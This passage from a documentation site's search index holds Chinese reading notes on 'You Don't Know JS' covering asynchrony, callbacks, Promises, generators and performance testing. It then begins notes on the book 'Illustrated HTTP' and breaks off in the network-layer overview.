\u5f7b,\u7a0d\u4e0d\u6ce8\u610f\u5c31\u5f88\u5bb9\u6613\u51fa\u9519\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#this","title":"\u7b2c\u4e8c\u90e8\u5206 this \u548c\u5bf9\u8c61\u539f\u578b","text":""},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_7","title":"\u5f02\u6b65\uff1a\u73b0\u5728\u4e0e\u5c06\u6765","text":"<p>\u5b9e\u9645\u4e0a, JavaScript \u7a0b\u5e8f\u603b\u662f\u81f3\u5c11\u5206\u4e3a\u4e24\u4e2a\u5757:\u7b2c\u4e00\u5757 \u73b0\u5728 \u8fd0\u884c;\u4e0b\u4e00\u5757 \u5c06\u6765 \u8fd0\u884c, \u4ee5\u54cd \u5e94\u67d0\u4e2a\u4e8b\u4ef6\u3002\u5c3d\u7ba1\u7a0b\u5e8f\u662f\u4e00\u5757\u4e00\u5757\u6267\u884c\u7684,\u4f46\u662f\u6240\u6709\u8fd9\u4e9b\u5757\u5171\u4eab\u5bf9\u7a0b\u5e8f\u4f5c\u7528\u57df\u548c\u72b6\u6001\u7684\u8bbf \u95ee,\u6240\u4ee5\u5bf9\u72b6\u6001\u7684\u4fee\u6539\u90fd\u662f\u5728\u4e4b\u524d\u7d2f\u79ef\u7684\u4fee\u6539\u4e4b\u4e0a\u8fdb\u884c\u7684\u3002 \u4e00\u65e6\u6709\u4e8b\u4ef6\u9700\u8981\u8fd0\u884c, \u4e8b\u4ef6\u5faa\u73af\u5c31\u4f1a\u8fd0\u884c, \u76f4\u5230\u961f\u5217\u6e05\u7a7a\u3002 \u4e8b\u4ef6\u5faa\u73af\u7684\u6bcf\u4e00\u8f6e\u79f0\u4e3a\u4e00\u4e2a tick\u3002 \u7528\u6237\u4ea4\u4e92\u3001IO \u548c\u5b9a\u65f6\u5668\u4f1a\u5411\u4e8b\u4ef6\u961f\u5217\u4e2d\u52a0\u5165\u4e8b\u4ef6\u3002 \u4efb\u610f\u65f6\u523b,\u4e00\u6b21\u53ea\u80fd\u4ece\u961f\u5217\u4e2d\u5904\u7406\u4e00\u4e2a\u4e8b\u4ef6\u3002\u6267\u884c\u4e8b\u4ef6\u7684\u65f6\u5019,\u53ef\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u5730\u5f15\u53d1\u4e00 \u4e2a\u6216\u591a\u4e2a\u540e\u7eed\u4e8b\u4ef6\u3002 \u5e76\u53d1\u662f\u6307\u4e24\u4e2a\u6216\u591a\u4e2a\u4e8b\u4ef6\u94fe\u968f\u65f6\u95f4\u53d1\u5c55\u4ea4\u66ff\u6267\u884c,\u4ee5\u81f3\u4e8e\u4ece\u66f4\u9ad8\u7684\u5c42\u6b21\u6765\u770b,\u5c31\u50cf\u662f\u540c\u65f6 \u5728\u8fd0\u884c(\u5c3d\u7ba1\u5728\u4efb\u610f\u65f6\u523b\u53ea\u5904\u7406\u4e00\u4e2a\u4e8b\u4ef6)\u3002 \u901a\u5e38\u9700\u8981\u5bf9\u8fd9\u4e9b\u5e76\u53d1\u6267\u884c\u7684\u201c\u8fdb\u7a0b\u201d(\u6709\u522b\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u6982\u5ff5)\u8fdb\u884c\u67d0\u79cd\u5f62\u5f0f\u7684\u4ea4 \u4e92\u534f\u8c03,\u6bd4\u5982\u9700\u8981\u786e\u4fdd\u6267\u884c\u987a\u5e8f\u6216\u8005\u9700\u8981\u9632\u6b62\u7ade\u6001\u51fa\u73b0\u3002\u8fd9\u4e9b\u201c\u8fdb\u7a0b\u201d\u4e5f\u53ef\u4ee5\u901a\u8fc7\u628a\u81ea\u8eab \u5206\u5272\u4e3a\u66f4\u5c0f\u7684\u5757,\u4ee5\u4fbf\u5176\u4ed6\u201c\u8fdb\u7a0b\u201d\u63d2\u5165\u8fdb\u6765\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_8","title":"\u56de\u8c03","text":"<p>\u56de\u8c03\u51fd\u6570\u662f JavaScript \u5f02\u6b65\u7684\u57fa\u672c\u5355\u5143\u3002\u4f46\u662f\u968f\u7740 JavaScript \u8d8a\u6765\u8d8a\u6210\u719f,\u5bf9\u4e8e\u5f02\u6b65\u7f16\u7a0b\u9886\u57df\u7684\u53d1\u5c55,\u56de\u8c03\u5df2\u7ecf\u4e0d\u591f\u7528\u4e86\u3002 \u7b2c\u4e00,\u5927\u8111\u5bf9\u4e8e\u4e8b\u60c5\u7684\u8ba1\u5212\u65b9\u5f0f\u662f\u7ebf\u6027\u7684\u3001\u963b\u585e\u7684\u3001\u5355\u7ebf\u7a0b\u7684\u8bed\u4e49,\u4f46\u662f\u56de\u8c03\u8868\u8fbe\u5f02\u6b65\u6d41 \u7a0b\u7684\u65b9\u5f0f\u662f\u975e\u7ebf\u6027\u7684\u3001\u975e\u987a\u5e8f\u7684,\u8fd9\u4f7f\u5f97\u6b63\u786e\u63a8\u5bfc\u8fd9\u6837\u7684\u4ee3\u7801\u96be\u5ea6\u5f88\u5927\u3002\u96be\u4e8e\u7406\u89e3\u7684\u4ee3\u7801 \u662f\u574f\u4ee3\u7801,\u4f1a\u5bfc\u81f4\u574f bug\u3002 \u6211\u4eec\u9700\u8981\u4e00\u79cd\u66f4\u540c\u6b65\u3001\u66f4\u987a\u5e8f\u3001\u66f4\u963b\u585e\u7684\u7684\u65b9\u5f0f\u6765\u8868\u8fbe\u5f02\u6b65,\u5c31\u50cf\u6211\u4eec\u7684\u5927\u8111\u4e00\u6837\u3002 \u7b2c\u4e8c,\u4e5f\u662f\u66f4\u91cd\u8981\u7684\u4e00\u70b9,\u56de\u8c03\u4f1a\u53d7\u5230\u63a7\u5236\u53cd\u8f6c\u7684\u5f71\u54cd,\u56e0\u4e3a\u56de\u8c03\u6697\u4e2d\u628a\u63a7\u5236\u6743\u4ea4\u7ed9\u7b2c\u4e09 \u65b9(\u901a\u5e38\u662f\u4e0d\u53d7\u4f60\u63a7\u5236\u7684\u7b2c\u4e09\u65b9\u5de5\u5177!)\u6765\u8c03\u7528\u4f60\u4ee3\u7801\u4e2d\u7684 continuation\u3002 \u8fd9\u79cd\u63a7\u5236\u8f6c\u79fb\u5bfc \u81f4\u4e00\u7cfb\u5217\u9ebb\u70e6\u7684\u4fe1\u4efb\u95ee\u9898,\u6bd4\u5982\u56de\u8c03\u88ab\u8c03\u7528\u7684\u6b21\u6570\u662f\u5426\u4f1a\u8d85\u51fa\u9884\u671f\u3002 \u53ef\u4ee5\u53d1\u660e\u4e00\u4e9b\u7279\u5b9a\u903b\u8f91\u6765\u89e3\u51b3\u8fd9\u4e9b\u4fe1\u4efb\u95ee\u9898,\u4f46\u662f\u5176\u96be\u5ea6\u9ad8\u4e8e\u5e94\u6709\u7684\u6c34\u5e73,\u53ef\u80fd\u4f1a\u4ea7\u751f\u66f4 \u7b28\u91cd\u3001\u66f4\u96be\u7ef4\u62a4\u7684\u4ee3\u7801,\u5e76\u4e14\u7f3a\u5c11\u8db3\u591f\u7684\u4fdd\u62a4,\u5176\u4e2d\u7684\u635f\u5bb3\u8981\u76f4\u5230\u4f60\u53d7\u5230 bug \u7684\u5f71\u54cd\u624d\u4f1a \u88ab\u53d1\u73b0\u3002 \u6211\u4eec\u9700\u8981\u4e00\u4e2a\u901a\u7528\u7684\u65b9\u6848\u6765\u89e3\u51b3\u8fd9\u4e9b\u4fe1\u4efb\u95ee\u9898\u3002\u4e0d\u7ba1\u6211\u4eec\u521b\u5efa\u591a\u5c11\u56de\u8c03,\u8fd9\u4e00\u65b9\u6848\u90fd\u5e94\u53ef \u4ee5\u590d\u7528,\u4e14\u6ca1\u6709\u91cd\u590d\u4ee3\u7801\u7684\u5f00\u9500\u3002 \u6211\u4eec\u9700\u8981\u6bd4\u56de\u8c03\u66f4\u597d\u7684\u673a\u5236\u3002\u5230\u76ee\u524d\u4e3a\u6b62,\u56de\u8c03\u63d0\u4f9b\u4e86\u5f88\u597d\u7684\u670d\u52a1,\u4f46\u662f\u672a\u6765\u7684 JavaScript \u9700\u8981\u66f4\u9ad8\u7ea7\u3001\u529f\u80fd\u66f4\u5f3a\u5927\u7684\u5f02\u6b65\u6a21\u5f0f\u3002\u672c\u4e66\u63a5\u4e0b\u6765\u7684\u51e0\u7ae0\u4f1a\u6df1\u5165\u63a2\u8ba8\u8fd9\u4e9b\u65b0\u578b\u6280\u672f\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#promise","title":"Promise","text":"<p>Promise \u975e\u5e38\u597d,\u8bf7\u4f7f\u7528\u3002\u5b83\u4eec\u89e3\u51b3\u4e86\u6211\u4eec\u56e0\u53ea\u7528\u56de\u8c03\u7684\u4ee3\u7801\u800c\u5907\u53d7\u56f0\u6270\u7684\u63a7\u5236\u53cd\u8f6c\u95ee\u9898\u3002 \u5b83\u4eec\u5e76\u6ca1\u6709\u6448\u5f03\u56de\u8c03,\u53ea\u662f\u628a\u56de\u8c03\u7684\u5b89\u6392\u8f6c\u4ea4\u7ed9\u4e86\u4e00\u4e2a\u4f4d\u4e8e\u6211\u4eec\u548c\u5176\u4ed6\u5de5\u5177\u4e4b\u95f4\u7684\u53ef\u4fe1\u4efb \u7684\u4e2d\u4ecb\u673a\u5236\u3002 Promise \u94fe\u4e5f\u5f00\u59cb\u63d0\u4f9b(\u5c3d\u7ba1\u5e76\u4e0d\u5b8c\u7f8e)\u4ee5\u987a\u5e8f\u7684\u65b9\u5f0f\u8868\u8fbe\u5f02\u6b65\u6d41\u7684\u4e00\u4e2a\u66f4\u597d\u7684\u65b9\u6cd5,\u8fd9 \u6709\u52a9\u4e8e\u6211\u4eec\u7684\u5927\u8111\u66f4\u597d\u5730\u8ba1\u5212\u548c\u7ef4\u62a4\u5f02\u6b65 JavaScript \u4ee3\u7801\u3002\u6211\u4eec\u5c06\u5728\u7b2c 4 \u7ae0\u770b\u5230\u9488\u5bf9\u8fd9\u4e2a \u95ee\u9898\u7684\u4e00\u79cd\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848!</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_9","title":"\u751f\u6210\u5668","text":"<p>\u751f\u6210\u5668\u662f ES6 \u7684\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u7c7b\u578b, \u5b83\u5e76\u4e0d\u50cf\u666e\u901a\u51fd\u6570\u90a3\u6837\u603b\u662f\u8fd0\u884c\u5230\u7ed3\u675f\u3002 \u53d6\u800c\u4ee3\u4e4b \u7684\u662f, \u751f\u6210\u5668\u53ef\u4ee5\u5728\u8fd0\u884c\u5f53\u4e2d(\u5b8c\u5168\u4fdd\u6301\u5176\u72b6\u6001)\u6682\u505c, \u5e76\u4e14\u5c06\u6765\u518d\u4ece\u6682\u505c\u7684\u5730\u65b9\u6062\u590d \u8fd0\u884c\u3002 \u8fd9\u79cd\u4ea4\u66ff\u7684\u6682\u505c\u548c\u6062\u590d\u662f\u5408\u4f5c\u6027\u7684\u800c\u4e0d\u662f\u62a2\u5360\u5f0f\u7684,\u8fd9\u610f\u5473\u7740\u751f\u6210\u5668\u5177\u6709\u72ec\u4e00\u65e0\u4e8c\u7684\u80fd\u529b \u6765\u6682\u505c\u81ea\u8eab,\u8fd9\u662f\u901a\u8fc7\u5173\u952e\u5b57 yield \u5b9e\u73b0\u7684\u3002\u4e0d\u8fc7,\u53ea\u6709\u63a7\u5236\u751f\u6210\u5668\u7684\u8fed\u4ee3\u5668\u5177\u6709\u6062\u590d\u751f \u6210\u5668\u7684\u80fd\u529b(\u901a\u8fc7 next(..) )\u3002 yield / next(..) \u8fd9\u4e00\u5bf9\u4e0d\u53ea\u662f\u4e00\u79cd\u63a7\u5236\u673a\u5236,\u5b9e\u9645\u4e0a\u4e5f\u662f\u4e00\u79cd\u53cc\u5411\u6d88\u606f\u4f20\u9012\u673a\u5236\u3002 yield .. \u8868 \u8fbe\u5f0f\u672c\u8d28\u4e0a\u662f\u6682\u505c\u4e0b\u6765\u7b49\u5f85\u67d0\u4e2a\u503c,\u63a5\u4e0b\u6765\u7684 next(..) \u8c03\u7528\u4f1a\u5411\u88ab\u6682\u505c\u7684 yield \u8868\u8fbe\u5f0f\u4f20\u56de \u4e00\u4e2a\u503c(\u6216\u8005\u662f\u9690\u5f0f\u7684 undefined )\u3002 \u5728\u5f02\u6b65\u63a7\u5236\u6d41\u7a0b\u65b9\u9762,\u751f\u6210\u5668\u7684\u5173\u952e\u4f18\u70b9\u662f:\u751f\u6210\u5668\u5185\u90e8\u7684\u4ee3\u7801\u662f\u4ee5\u81ea\u7136\u7684\u540c\u6b65 / \u987a\u5e8f\u65b9 \u5f0f\u8868\u8fbe\u4efb\u52a1\u7684\u4e00\u7cfb\u5217\u6b65\u9aa4\u3002\u5176\u6280\u5de7\u5728\u4e8e,\u6211\u4eec\u628a\u53ef\u80fd\u7684\u5f02\u6b65\u9690\u85cf\u5728\u4e86\u5173\u952e\u5b57 yield \u7684\u540e\u9762, \u628a\u5f02\u6b65\u79fb\u52a8\u5230\u63a7\u5236\u751f\u6210\u5668\u7684\u8fed\u4ee3\u5668\u7684\u4ee3\u7801\u90e8\u5206\u3002 \u6362\u53e5\u8bdd\u8bf4,\u751f\u6210\u5668\u4e3a\u5f02\u6b65\u4ee3\u7801\u4fdd\u6301\u4e86\u987a\u5e8f\u3001\u540c\u6b65\u3001\u963b\u585e\u7684\u4ee3\u7801\u6a21\u5f0f,\u8fd9\u4f7f\u5f97\u5927\u8111\u53ef\u4ee5\u66f4\u81ea \u7136\u5730\u8ffd\u8e2a\u4ee3\u7801,\u89e3\u51b3\u4e86\u57fa\u4e8e\u56de\u8c03\u7684\u5f02\u6b65\u7684\u4e24\u4e2a\u5173\u952e\u7f3a\u9677\u4e4b\u4e00\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_10","title":"\u7a0b\u5e8f\u6027\u80fd","text":"<p>\u672c\u90e8\u5206\u7684\u524d\u56db\u7ae0\u90fd\u662f\u57fa\u4e8e\u8fd9\u6837\u4e00\u4e2a\u524d\u63d0:\u5f02\u6b65\u7f16\u7801\u6a21\u5f0f\u4f7f\u6211\u4eec\u80fd\u591f\u7f16\u5199\u66f4\u9ad8\u6548\u7684\u4ee3\u7801,\u901a \u5e38\u80fd\u591f\u5e26\u6765\u975e\u5e38\u5927\u7684\u6539\u8fdb\u3002\u4f46\u662f,\u5f02\u6b65\u7279\u6027\u53ea\u80fd\u8ba9\u4f60\u8d70\u8fd9\u4e48\u8fdc,\u56e0\u4e3a\u5b83\u672c\u8d28\u4e0a\u8fd8\u662f\u7ed1\u5b9a\u5728 \u4e00\u4e2a\u5355\u4e8b\u4ef6\u5faa\u73af\u7ebf\u7a0b\u4e0a\u3002 \u56e0\u6b64,\u5728\u8fd9\u4e00\u7ae0\u91cc,\u6211\u4eec\u4ecb\u7ecd\u4e86\u51e0\u79cd\u80fd\u591f\u8fdb\u4e00\u6b65\u63d0\u9ad8\u6027\u80fd\u7684\u7a0b\u5e8f\u7ea7\u522b\u7684\u673a\u5236\u3002 Web Worker \u8ba9\u4f60\u53ef\u4ee5\u5728\u72ec\u7acb\u7684\u7ebf\u7a0b\u8fd0\u884c\u4e00\u4e2a JavaScript \u6587\u4ef6(\u5373\u7a0b\u5e8f),\u4f7f\u7528\u5f02\u6b65\u4e8b\u4ef6\u5728 \u7ebf\u7a0b\u4e4b\u95f4\u4f20\u9012\u6d88\u606f\u3002 \u5b83\u4eec\u975e\u5e38\u9002\u7528\u4e8e\u628a\u957f\u65f6\u95f4\u7684\u6216\u8d44\u6e90\u5bc6\u96c6\u578b\u7684\u4efb\u52a1\u5378\u8f7d\u5230\u4e0d\u540c\u7684\u7ebf\u7a0b \u4e2d,\u4ee5\u63d0\u9ad8\u4e3b UI \u7ebf\u7a0b\u7684\u54cd\u5e94\u6027\u3002 SIMD \u6253\u7b97\u628a CPU \u7ea7\u7684\u5e76\u884c\u6570\u5b66\u8fd0\u7b97\u6620\u5c04\u5230 JavaScript API, \u4ee5\u83b7\u5f97\u9ad8\u6027\u80fd\u7684\u6570\u636e\u5e76\u884c\u8fd0\u7b97,\u6bd4\u5982\u5728\u5927\u6570\u636e\u96c6\u4e0a\u7684\u6570\u5b57\u5904\u7406\u3002 \u6700\u540e, asm.js \u63cf\u8ff0\u4e86 JavaScript \u7684\u4e00\u4e2a\u5f88\u5c0f\u7684\u5b50\u96c6, \u5b83\u907f\u514d\u4e86 JavaScript \u96be\u4ee5\u4f18\u5316\u7684\u90e8\u5206 (\u6bd4\u5982\u5783\u573e\u6536\u96c6\u548c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362),\u5e76\u4e14\u8ba9 JavaScript \u5f15\u64ce\u8bc6\u522b\u5e76\u901a\u8fc7\u6fc0\u8fdb\u7684\u4f18\u5316\u8fd0\u884c\u8fd9\u6837 \u7684\u4ee3\u7801\u3002\u53ef\u4ee5\u624b\u5de5\u7f16\u5199 asm.js, \u4f46\u662f\u4f1a\u6781\u7aef\u8d39\u529b\u4e14\u5bb9\u6613\u51fa\u9519,\u7c7b\u4f3c\u4e8e\u624b\u5199\u6c47\u7f16\u8bed\u8a00(\u8fd9\u4e5f \u662f\u5176\u540d\u5b57\u7684\u7531\u6765)\u3002\u5b9e\u9645\u4e0a, asm.js \u4e5f\u662f\u9ad8\u5ea6\u4f18\u5316\u7684\u7a0b\u5e8f\u8bed\u8a00\u4ea4\u53c9\u7f16\u8bd1\u7684\u4e00\u4e2a\u5f88\u597d\u7684\u76ee\u6807, \u6bd4\u5982 Emscripten \u628a C/C++ \u8f6c\u6362\u6210 JavaScript(https://github.com/kripken/em...) \u3002 JavaScript \u8fd8\u6709\u4e00\u4e9b\u66f4\u52a0\u6fc0\u8fdb\u7684\u601d\u8def\u5df2\u7ecf\u8fdb\u5165\u975e\u5e38\u65e9\u671f\u7684\u8ba8\u8bba, \u5c3d\u7ba1\u672c\u7ae0\u5e76\u6ca1\u6709\u660e\u786e\u5305\u542b \u8fd9\u4e9b\u5185\u5bb9,\u6bd4\u5982\u8fd1\u4f3c\u7684\u76f4\u63a5\u591a\u7ebf\u7a0b\u529f\u80fd(\u800c\u4e0d\u662f\u85cf\u5728\u6570\u636e\u7ed3\u6784 API \u540e\u9762)\u3002\u4e0d\u7ba1\u8fd9\u4e9b\u6700\u7ec8 \u4f1a\u4e0d\u4f1a\u5b9e\u73b0,\u8fd8\u662f\u6211\u4eec\u5c06\u53ea\u80fd\u770b\u5230\u66f4\u591a\u7684\u5e76\u884c\u7279\u6027\u5077\u5077\u52a0\u5165 JavaScript, \u4f46\u786e\u5b9e\u53ef\u4ee5\u9884\u89c1, \u672a\u6765 JavaScript \u5728\u7a0b\u5e8f\u7ea7\u522b\u5c06\u83b7\u5f97\u66f4\u52a0\u4f18\u5316\u7684\u6027\u80fd\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_11","title":"\u6027\u80fd\u6d4b\u8bd5\u4e0e\u8c03\u4f18","text":"<p>\u5bf9\u4e00\u6bb5\u4ee3\u7801\u8fdb\u884c\u6709\u6548\u7684\u6027\u80fd\u6d4b\u8bd5,\u7279\u522b\u662f\u4e0e\u540c\u6837\u4ee3\u7801\u7684\u53e6\u5916\u4e00\u4e2a\u9009\u62e9\u5bf9\u6bd4\u6765\u770b\u770b\u54ea\u79cd\u65b9\u6848 \u66f4\u5feb,\u9700\u8981\u8ba4\u771f\u6ce8\u610f\u7ec6\u8282\u3002 \u4e0e\u5176\u6253\u9020\u4f60\u81ea\u5df1\u7684\u7edf\u8ba1\u6709\u6548\u7684\u6027\u80fd\u6d4b\u8bd5\u903b\u8f91,\u4e0d\u5982\u76f4\u63a5\u4f7f\u7528 Benchmark.js \u5e93,\u5b83\u5df2\u7ecf\u4e3a\u4f60 \u5b9e\u73b0\u4e86\u8fd9\u4e9b\u3002\u4f46\u662f,\u7f16\u5199\u6d4b\u8bd5\u8981\u5c0f\u5fc3,\u56e0\u4e3a\u6211\u4eec\u5f88\u5bb9\u6613\u5c31\u4f1a\u6784\u9020\u4e00\u4e2a\u770b\u4f3c\u6709\u6548\u5b9e\u9645\u5374\u6709\u7f3a \u9677\u7684\u6d4b\u8bd5,\u5373\u4f7f\u662f\u5fae\u5c0f\u7684\u5dee\u5f02\u4e5f\u53ef\u80fd\u626d\u66f2\u7ed3\u679c,\u4f7f\u5176\u5b8c\u5168\u4e0d\u53ef\u9760\u3002</p> <p>\u4ece\u5c3d\u53ef\u80fd\u591a\u7684\u73af\u5883\u4e2d\u5f97\u5230\u5c3d\u53ef\u80fd\u591a\u7684\u6d4b\u8bd5\u7ed3\u679c\u4ee5\u6d88\u9664\u786c\u4ef6/ \u8bbe\u5907\u7684\u504f\u5dee, \u8fd9\u4e00\u70b9\u5f88\u91cd\u8981\u3002 http://jsPerf.com \u662f\u5f88\u597d\u7684\u7f51\u7ad9,\u7528\u4e8e\u4f17\u5305\u6027\u80fd\u6d4b\u8bd5\u8fd0\u884c\u3002</p> <p>\u9057\u61be\u7684\u662f,\u5f88\u591a\u5e38\u7528\u7684\u6027\u80fd\u6d4b\u8bd5\u6267\u8ff7\u4e8e\u65e0\u5173\u7d27\u8981\u7684\u5fae\u89c2\u6027\u80fd\u7ec6\u8282,\u6bd4\u5982 x++ \u5bf9\u6bd4 ++x \u3002\u7f16 \u5199\u597d\u7684\u6d4b\u8bd5\u610f\u5473\u7740\u7406\u89e3\u5982\u4f55\u5173\u6ce8\u5927\u5c40, \u6bd4\u5982\u5173\u952e\u8def\u5f84\u4e0a\u7684\u4f18\u5316\u4ee5\u53ca\u907f\u514d\u843d\u5165\u7c7b\u4f3c\u4e0d\u540c\u7684 JavaScript \u5b9e\u73b0\u7ec6\u8282\u8fd9\u6837\u7684\u9677\u9631\u4e2d\u3002</p> <p>\u5c3e\u8c03\u7528\u4f18\u5316\u662f ES6 \u8981\u6c42\u7684\u4e00\u79cd\u4f18\u5316\u65b9\u6cd5\u3002\u5b83\u4f7f JavaScript \u4e2d\u539f\u672c\u4e0d\u53ef\u80fd\u7684\u4e00\u4e9b\u9012\u5f52\u6a21\u5f0f\u53d8 \u5f97\u5b9e\u9645\u3002 TCO \u5141\u8bb8\u4e00\u4e2a\u51fd\u6570\u5728\u7ed3\u5c3e\u5904\u8c03\u7528\u53e6\u5916\u4e00\u4e2a\u51fd\u6570\u6765\u6267\u884c,\u4e0d\u9700\u8981\u4efb\u4f55\u989d\u5916\u8d44\u6e90\u3002\u8fd9\u610f\u5473\u7740,\u5bf9\u9012\u5f52\u7b97\u6cd5\u6765\u8bf4,\u5f15\u64ce\u4e0d\u518d\u9700\u8981\u9650\u5236\u6808\u6df1\u5ea6\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/","title":"\u7cbe\u8bfb\u300a\u56fe\u89e3HTTP\u300b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 8333  \u9605\u8bfb17\u5206\u949f</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#_1","title":"\u524d\u8a00","text":"<p>\u4f5c\u4e3a\u4e00\u4e2a\u524d\u7aef\uff0c\u5982\u679c\u80fd\u591f\u6df1\u523b\u7406\u89e3 HTTP \u901a\u4fe1\uff0c\u80fd\u591f\u8ba9\u6211\u4eec\u5728\u65e5\u5e38\u5f00\u53d1\u5de5\u4f5c\u4e2d\u5feb\u901f\u5b9a\u4f4d\u95ee\u9898\u3002\u6240\u4ee5\u6211\u5341\u5206\u5efa\u8bae\u5927\u5bb6\u53bb\u8bfb\u4e00\u4e0b\u300a\u56fe\u89e3HTTP\u300b\u548c\u300aHTTP\u6743\u5a01\u6307\u5357\u300b\u3002\u6743\u5a01\u6307\u5357\u8bb2\u89e3\u7684\u5341\u5206\u8be6\u7ec6\uff0c\u5185\u5bb9\u4e5f\u5341\u5206\u7684\u5168\u9762\uff0c\u4f46\u662f\u8fd9\u672c\u4e66\u7684\u539a\u5ea6\u4e5f\u8ba9\u5f88\u591a\u540c\u5b66\u671b\u800c\u5374\u6b65\u3002\u63a8\u8350\u5927\u5bb6\u4ece \u300a\u56fe\u89e3HTTP\u300b \u8fd9\u672c\u4e66\u5f00\u59cb\u5b66\u4e60\uff0c\u8fd9\u672c\u4e66\u867d\u7136\u6ca1\u6709\u6743\u5a01\u6307\u5357\u8be6\u7ec6\uff0c\u4f46\u6db5\u76d6\u4e86\u5f88\u591a\u6211\u4eec\u65e5\u5e38\u5f00\u53d1\u9700\u8981\u7684\u77e5\u8bc6\u70b9\uff0c\u7406\u89e3\u4ed6\uff0c\u80fd\u8ba9\u6211\u4eec\u7684\u5f00\u53d1\u6548\u7387\u4e8b\u534a\u529f\u500d\u3002</p> <p>\u300a\u56fe\u89e3HTTP\u300b\u8fd9\u672c\u4e66\u5bf9\u4e92\u8054\u7f51\u57fa\u76d8\u2014\u2014 HTTP \u534f\u8bae\u8fdb\u884c\u4e86\u5168\u9762\u7cfb\u7edf\u7684\u4ecb\u7ecd\u3002\u4f5c\u8005\u4ece HTTP \u53d1\u5c55\u53f2\u5f00\u59cb\uff0c\u4e25\u8c28\u5730\u5256\u6790\u4e86 HTTP \u534f\u8bae\u7684\u7ed3\u6784\uff0c\u5217\u4e3e\u5f88\u591a\u5e38\u89c1\u901a\u4fe1\u573a\u666f\u53ca\u5b9e\u6218\u6848\u4f8b\uff0c\u6700\u540e\u5ef6\u4f38\u5230Web\u5b89\u5168\u3001\u6700\u65b0\u6280\u672f\u52a8\u5411\u7b49\u65b9\u9762\u3002\u901a\u8fc7\u4e66\u4e2d\u5927\u91cf\u751f\u52a8\u5f62\u8c61\u7684\u901a\u4fe1\u56fe\u4f8b\uff0c\u6211\u4eec\u80fd\u591f\u66f4\u5168\u9762\u5730\u7406\u89e3 HTTP \u901a\u4fe1\u8fc7\u7a0b\u4e2d\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u4ea4\u4e92\u60c5\u51b5\u3002\u5728\u8bfb\u8fd9\u672c\u4e66\u7684\u8fc7\u7a0b\u4e2d\u6211\u6536\u83b7\u9887\u591a\uff0c\u5e76\u7528\u601d\u7ef4\u5bfc\u56fe\u7684\u65b9\u5f0f\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u81ea\u5df1\u540e\u671f\u6e29\u6545\u3002\u5982\u679c\u4f60\u521a\u597d\u6ca1\u6709\u8bfb\u8fc7\uff0c\u53ef\u4ee5\u5f53\u505a\u5ea6\u8fd9\u672c\u4e66\u7684\u9884\u4e60\u9605\u8bfb\uff0c\u76f8\u4fe1\u4f60\u4e5f\u4f1a\u6709\u6240\u6536\u83b7\uff08\u601d\u7ef4\u5bfc\u56fe\u56fe\u7247\u53ef\u80fd\u6709\u70b9\u5c0f\uff0c\u8bb0\u5f97\u70b9\u5f00\u770b\uff09 \u4e86\u89e3 HTTP \u534f\u8bae\u8bbf\u95ee Web</p> <p>\u8fd9\u4e00\u7ae0\u4ecb\u7ecd\u4e86 Web \u53ca\u7f51\u7edc\u534f\u8bae\u7684\u57fa\u7840\uff0chttp \u901a\u8baf\u88ab\u62c6\u5206\u6210\u56db\u5c42\uff0c\u5e94\u7528\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u7f51\u7edc\u5c42\u548c\u94fe\u8def\u5c42\uff0c\u6bcf\u5c42\u53ea\u8981\u8003\u8651\u5206\u6d3e\u7ed9\u81ea\u5df1\u7684\u4efb\u52a1\uff0c\u4e0d\u9700\u8981\u5f04\u6e05\u6574\u4e2a\u534f\u8bae\u94fe\u8def\u7684\u7ec6\u8282\u3002\u5e94\u7528\u5c42\u4f7f\u6211\u4eec\u8089\u773c\u80fd\u770b\u89c1\u7684\uff0c\u6211\u4eec\u5e38\u7528\u7684 http \u534f\u8bae\u548c FTP \u534f\u8bae\u5c31\u5904\u5728\u8fd9\u4e00\u5c42\uff0c\u5f80\u4e0b\u5c31\u662f\u4f20\u8f93\u5c42\uff0cTCP/IP \u534f\u8bae\u5de5\u4f5c\u7684\u5730\u65b9\uff08\u6211\u4eec\u7684IP\u662fIP\u5730\u5740\uff0c\u548c\u8fd9\u91cc\u7684IP 